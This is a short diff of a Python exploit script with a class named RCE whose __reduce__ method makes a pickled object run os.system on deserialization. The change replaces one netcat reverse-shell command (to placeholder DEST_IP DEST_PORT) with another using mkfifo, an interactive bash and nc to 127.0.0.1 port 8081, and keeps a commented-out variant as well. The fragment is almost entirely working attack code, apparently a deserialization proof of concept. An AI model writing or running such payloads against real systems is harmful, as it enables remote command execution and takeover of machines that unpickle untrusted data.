@@ -31,7 +31,7 @@ class RCE:
     def __reduce__(self):
         #cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
         #       '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
-        cmd='mkfifo /tmp/pipe;cat /tmp/pipe|nc DEST_IP DEST_PORT|/bin/bash &>/tmp/pipe;rm /tmp/pipe'
+        cmd='mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 127.0.0.1 8081 >/tmp/f'
         
         return os.system, (cmd,)
         
